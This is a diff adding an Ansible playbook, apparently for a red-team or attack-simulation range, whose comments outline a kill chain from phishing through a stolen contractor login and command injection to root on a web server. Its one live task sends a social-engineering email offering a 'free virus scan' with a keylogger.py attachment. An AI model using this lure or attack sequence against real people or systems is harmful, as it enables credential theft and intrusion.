@@ -1,0 +1,18 @@
+---
+#
+# Stage I: Initial compromise (phishing inject)
+#     1. Send phishing email
+#     2. Download malicious software
+#     3. Obtain contractor's account username and password
+#     4. Login to Bullseye webserver as contractor
+#     5. Upload shell file to implement command injection 
+#     6. Run system command as root on web server
+#
+- name: phishing inject
+  hosts: blackhat
+  tasks:
+    - name: send a phishing email
+      raw: echo "Are you frustrated with how slow your computer is? Open the attachment for a free virus scan!" | mutt -s "Free virus scan!" -a keylogger.py -- contractor@fazio.com
+    # - name: upload xor encryption script
+    #   raw: python package.py xor.py
+
